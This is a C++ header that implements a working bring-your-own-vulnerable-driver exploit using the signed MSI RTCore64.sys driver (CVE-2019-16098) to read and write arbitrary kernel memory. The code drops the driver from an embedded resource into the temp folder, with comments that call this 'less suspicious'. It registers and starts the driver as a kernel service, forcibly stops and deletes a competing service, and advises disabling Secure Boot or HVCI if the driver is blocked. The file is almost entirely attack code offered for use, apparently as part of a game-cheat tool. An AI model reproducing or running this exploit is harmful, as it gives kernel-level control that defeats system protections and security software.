#pragma once
// ============================================================
// rtcore.h — RTCore64.sys (MSI Afterburner) BYOVD Provider
// CVE-2019-16098: Arbitrary physical memory R/W via IOCTL
// This driver is digitally signed by MSI and provides
// unchecked kernel memory read/write through device IOCTLs.
// ============================================================

#include <Windows.h>
#include <cstdint>
#include <cstdio>
#include "driver_provider.h"

namespace BYOVD
{
    // RTCore64.sys IOCTL codes (from public CVE disclosure)
    constexpr DWORD RTCORE_MAP_PHYS    = 0x80002048;
    constexpr DWORD RTCORE_UNMAP_PHYS  = 0x8000204C;
    constexpr DWORD RTCORE_READ_MEM    = 0x80002048;
    constexpr DWORD RTCORE_WRITE_MEM   = 0x8000204C;

    // RTCore memory R/W IOCTL structures
    #pragma pack(push, 1)
    struct RTCORE_MEMORY_READ
    {
        BYTE     Pad0[8];
        DWORD64  Address;
        BYTE     Pad1[8];
        DWORD    ReadSize;
        DWORD    Value;
        BYTE     Pad2[16];
    };

    struct RTCORE_MEMORY_WRITE
    {
        BYTE     Pad0[8];
        DWORD64  Address;
        BYTE     Pad1[8];
        DWORD    WriteSize;
        DWORD    Value;
        BYTE     Pad2[16];
    };
    #pragma pack(pop)

    class RTCoreProvider : public IDriverProvider
    {
        HANDLE m_hDevice = INVALID_HANDLE_VALUE;

        static constexpr const wchar_t* SVC_NAME = L"RTCore64cs2";
        static constexpr const wchar_t* DEV_PATH = L"\\\\.\\RTCore64";
        static constexpr const char*    DISP_NAME = "RTCore64";

    public:
        const wchar_t* ServiceName() const override { return SVC_NAME; }
        const char*    DisplayName() const override  { return DISP_NAME; }
        bool Open() override
        {
            // Try to open existing device first (may already be loaded by another project)
            m_hDevice = CreateFileW(
                DEV_PATH,
                GENERIC_READ | GENERIC_WRITE,
                0, nullptr, OPEN_EXISTING, 0, nullptr);

            if (m_hDevice == INVALID_HANDLE_VALUE)
            {
                printf("[BYOVD] RTCore64 device not found, attempting to load driver...\n");
                if (!LoadDriver())
                    return false;

                m_hDevice = CreateFileW(
                    DEV_PATH,
                    GENERIC_READ | GENERIC_WRITE,
                    0, nullptr, OPEN_EXISTING, 0, nullptr);
            }

            if (m_hDevice == INVALID_HANDLE_VALUE)
            {
                printf("[BYOVD] Failed to open RTCore64 device (0x%lX)\n", GetLastError());
                return false;
            }

            printf("[BYOVD] RTCore64 device opened successfully\n");
            return true;
        }

        void Close() override
        {
            if (m_hDevice != INVALID_HANDLE_VALUE)
            {
                CloseHandle(m_hDevice);
                m_hDevice = INVALID_HANDLE_VALUE;
            }
        }

        // Read arbitrary kernel/physical memory (legacy template, kept for compat)
        template <typename T>
        T ReadMemoryT(uintptr_t address)
        {
            T result{};
            if (sizeof(T) <= 4)
            {
                RTCORE_MEMORY_READ memRead{};
                memRead.Address  = address;
                memRead.ReadSize = sizeof(T);

                DWORD bytesReturned = 0;
                DeviceIoControl(m_hDevice, 0x80002048,
                    &memRead, sizeof(memRead),
                    &memRead, sizeof(memRead),
                    &bytesReturned, nullptr);

                memcpy(&result, &memRead.Value, sizeof(T));
            }
            else
            {
                // For larger reads, read 4 bytes at a time
                auto* dst = reinterpret_cast<uint8_t*>(&result);
                for (size_t i = 0; i < sizeof(T); i += 4)
                {
                    RTCORE_MEMORY_READ memRead{};
                    memRead.Address  = address + i;
                    memRead.ReadSize = min(4U, (DWORD)(sizeof(T) - i));

                    DWORD bytesReturned = 0;
                    DeviceIoControl(m_hDevice, 0x80002048,
                        &memRead, sizeof(memRead),
                        &memRead, sizeof(memRead),
                        &bytesReturned, nullptr);

                    memcpy(dst + i, &memRead.Value, memRead.ReadSize);
                }
            }
            return result;
        }

        // Write arbitrary kernel/physical memory (legacy template, kept for compat)
        template <typename T>
        bool WriteMemoryT(uintptr_t address, const T& value)
        {
            if (sizeof(T) <= 4)
            {
                RTCORE_MEMORY_WRITE memWrite{};
                memWrite.Address   = address;
                memWrite.WriteSize = sizeof(T);
                memcpy(&memWrite.Value, &value, sizeof(T));

                DWORD bytesReturned = 0;
                return DeviceIoControl(m_hDevice, 0x8000204C,
                    &memWrite, sizeof(memWrite),
                    &memWrite, sizeof(memWrite),
                    &bytesReturned, nullptr) != 0;
            }
            else
            {
                auto* src = reinterpret_cast<const uint8_t*>(&value);
                for (size_t i = 0; i < sizeof(T); i += 4)
                {
                    RTCORE_MEMORY_WRITE memWrite{};
                    memWrite.Address   = address + i;
                    memWrite.WriteSize = min(4U, (DWORD)(sizeof(T) - i));
                    memcpy(&memWrite.Value, src + i, memWrite.WriteSize);

                    DWORD bytesReturned = 0;
                    if (!DeviceIoControl(m_hDevice, 0x8000204C,
                        &memWrite, sizeof(memWrite),
                        &memWrite, sizeof(memWrite),
                        &bytesReturned, nullptr))
                        return false;
                }
                return true;
            }
        }

        // Read a buffer of arbitrary size
        bool ReadBuffer(uintptr_t address, void* buffer, size_t size) override
        {
            auto* dst = reinterpret_cast<uint8_t*>(buffer);
            for (size_t i = 0; i < size; i += 4)
            {
                RTCORE_MEMORY_READ memRead{};
                memRead.Address  = address + i;
                memRead.ReadSize = (DWORD)min((size_t)4, size - i);

                DWORD bytesReturned = 0;
                if (!DeviceIoControl(m_hDevice, 0x80002048,
                    &memRead, sizeof(memRead),
                    &memRead, sizeof(memRead),
                    &bytesReturned, nullptr))
                    return false;

                memcpy(dst + i, &memRead.Value, memRead.ReadSize);
            }
            return true;
        }

        // Write a buffer of arbitrary size
        bool WriteBuffer(uintptr_t address, const void* buffer, size_t size) override
        {
            auto* src = reinterpret_cast<const uint8_t*>(buffer);
            for (size_t i = 0; i < size; i += 4)
            {
                RTCORE_MEMORY_WRITE memWrite{};
                memWrite.Address   = address + i;
                memWrite.WriteSize = (DWORD)min((size_t)4, size - i);
                memcpy(&memWrite.Value, src + i, memWrite.WriteSize);

                DWORD bytesReturned = 0;
                if (!DeviceIoControl(m_hDevice, 0x8000204C,
                    &memWrite, sizeof(memWrite),
                    &memWrite, sizeof(memWrite),
                    &bytesReturned, nullptr))
                    return false;
            }
            return true;
        }

        bool IsOpen() const override { return m_hDevice != INVALID_HANDLE_VALUE; }

        ~RTCoreProvider() override { Close(); }

    private:
        bool LoadDriver()
        {
            // Destination: temp directory (less suspicious than exe dir)
            wchar_t drvPath[MAX_PATH];
            GetTempPathW(MAX_PATH, drvPath);
            wcscat_s(drvPath, L"RTCore64.sys");

            // Try embedded resource first (single-EXE dist, ID 102 = RTCore64.sys)
            bool extracted = false;
            HRSRC hRes = FindResourceW(nullptr, MAKEINTRESOURCEW(102), MAKEINTRESOURCEW(10));
            if (hRes) {
                HGLOBAL hData = LoadResource(nullptr, hRes);
                DWORD sz = SizeofResource(nullptr, hRes);
                auto* ptr = static_cast<const BYTE*>(LockResource(hData));
                if (ptr && sz) {
                    HANDLE hf = CreateFileW(drvPath, GENERIC_WRITE, 0, nullptr,
                                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
                    if (hf != INVALID_HANDLE_VALUE) {
                        DWORD wr = 0;
                        WriteFile(hf, ptr, sz, &wr, nullptr);
                        CloseHandle(hf);
                        extracted = (wr == sz);
                    }
                }
            }

            if (!extracted)
            {
                // Fallback: look for RTCore64.sys next to the exe (dev layout)
                wchar_t selfDir[MAX_PATH];
                GetModuleFileNameW(nullptr, selfDir, MAX_PATH);
                wchar_t* sl = wcsrchr(selfDir, L'\\');
                if (sl) *(sl + 1) = L'\0';
                wcscat_s(selfDir, L"RTCore64.sys");

                if (GetFileAttributesW(selfDir) == INVALID_FILE_ATTRIBUTES)
                {
                    printf("[BYOVD] RTCore64.sys not available (no resource, no file)\n");
                    return false;
                }

                // Copy to temp (less suspicious path)
                CopyFileW(selfDir, drvPath, FALSE);
            }

            // Register as a kernel service
            SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
            if (!scm)
            {
                printf("[BYOVD] OpenSCManager failed (run as Admin)\n");
                return false;
            }

            // Remove old service with our name if exists
            SC_HANDLE existing = OpenServiceW(scm, SVC_NAME, SERVICE_ALL_ACCESS);
            if (existing)
            {
                SERVICE_STATUS ss;
                ControlService(existing, SERVICE_CONTROL_STOP, &ss);
                DeleteService(existing);
                CloseServiceHandle(existing);
                Sleep(1000);
            }

            SC_HANDLE svc = CreateServiceW(
                scm, SVC_NAME, SVC_NAME,
                SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                drvPath, nullptr, nullptr, nullptr, nullptr, nullptr);

            if (!svc)
            {
                DWORD err = GetLastError();

                if (err == ERROR_SERVICE_MARKED_FOR_DELETE)
                {
                    printf("[BYOVD] Service marked for delete — waiting for release...\n");
                    for (int retries = 0; retries < 40; ++retries)
                    {
                        Sleep(250);
                        svc = CreateServiceW(
                            scm, SVC_NAME, SVC_NAME,
                            SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                            SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                            drvPath, nullptr, nullptr, nullptr, nullptr, nullptr);
                        if (svc) break;
                        err = GetLastError();
                        if (err == ERROR_SERVICE_EXISTS)
                        {
                            svc = OpenServiceW(scm, SVC_NAME, SERVICE_ALL_ACCESS);
                            break;
                        }
                        if (err != ERROR_SERVICE_MARKED_FOR_DELETE) break;
                    }
                }
                else if (err == ERROR_SERVICE_EXISTS)
                {
                    svc = OpenServiceW(scm, SVC_NAME, SERVICE_ALL_ACCESS);
                }

                if (!svc)
                {
                    printf("[BYOVD] CreateService failed: 0x%lX\n", GetLastError());
                    CloseServiceHandle(scm);
                    return false;
                }
            }

            if (!StartServiceW(svc, 0, nullptr))
            {
                DWORD err = GetLastError();

                // 0xB7 (ERROR_ALREADY_EXISTS) = DriverEntry failed because
                // stale device objects exist from a previous load (e.g. Fortnite's
                // "RTCore64" service). Fix: stop that service, wait for full
                // driver unload, then retry.
                if (err == ERROR_ALREADY_EXISTS)
                {
                    printf("[BYOVD] Stale driver objects — stopping competing service...\n");

                    // Stop our failed service first
                    SERVICE_STATUS ss;
                    ControlService(svc, SERVICE_CONTROL_STOP, &ss);
                    DeleteService(svc);
                    CloseServiceHandle(svc);
                    svc = nullptr;

                    // Stop the "RTCore64" service (Fortnite's) to release stale objects
                    SC_HANDLE other = OpenServiceW(scm, L"RTCore64", SERVICE_ALL_ACCESS);
                    if (other)
                    {
                        ControlService(other, SERVICE_CONTROL_STOP, &ss);
                        DeleteService(other);
                        CloseServiceHandle(other);
                    }

                    // Wait for kernel to fully release the driver + device objects
                    printf("[BYOVD] Waiting for driver unload...\n");
                    for (int i = 0; i < 30; ++i)
                    {
                        Sleep(200);
                        HANDLE probe = CreateFileW(DEV_PATH,
                            GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                            nullptr, OPEN_EXISTING, 0, nullptr);
                        if (probe == INVALID_HANDLE_VALUE)
                            break; // Device gone — driver fully unloaded
                        CloseHandle(probe);
                    }
                    Sleep(1000); // Extra safety margin

                    // Re-create our service and start fresh
                    svc = CreateServiceW(
                        scm, SVC_NAME, SVC_NAME,
                        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                        drvPath, nullptr, nullptr, nullptr, nullptr, nullptr);
                    if (!svc)
                    {
                        DWORD e2 = GetLastError();
                        if (e2 == ERROR_SERVICE_EXISTS || e2 == ERROR_SERVICE_MARKED_FOR_DELETE)
                        {
                            // Wait for marked-for-delete to clear
                            for (int i = 0; i < 20; ++i)
                            {
                                Sleep(250);
                                svc = CreateServiceW(
                                    scm, SVC_NAME, SVC_NAME,
                                    SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                                    SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                                    drvPath, nullptr, nullptr, nullptr, nullptr, nullptr);
                                if (svc) break;
                            }
                        }
                        if (!svc)
                        {
                            printf("[BYOVD] Failed to re-create service: 0x%lX\n", GetLastError());
                            CloseServiceHandle(scm);
                            return false;
                        }
                    }

                    if (!StartServiceW(svc, 0, nullptr))
                    {
                        DWORD e3 = GetLastError();
                        if (e3 != ERROR_SERVICE_ALREADY_RUNNING)
                        {
                            printf("[BYOVD] Retry StartService failed: 0x%lX\n", e3);
                            DeleteService(svc);
                            CloseServiceHandle(svc);
                            CloseServiceHandle(scm);
                            return false;
                        }
                    }
                    printf("[BYOVD] Driver reloaded after cleanup\n");
                }
                else if (err != ERROR_SERVICE_ALREADY_RUNNING)
                {
                    printf("[BYOVD] StartService failed: 0x%lX\n", err);
                    printf("[BYOVD] Tip: Disable Secure Boot / HVCI if driver is blocked\n");
                    DeleteService(svc);
                    CloseServiceHandle(svc);
                    CloseServiceHandle(scm);
                    return false;
                }
            }

            printf("[BYOVD] RTCore64.sys loaded successfully\n");
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            return true;
        }
    };

    // Cleanup: unload RTCore64 driver and delete the service
    inline void UnloadRTCoreDriver()
    {
        UnloadDriverService(L"RTCore64cs2", L"RTCore64.sys");
    }
}
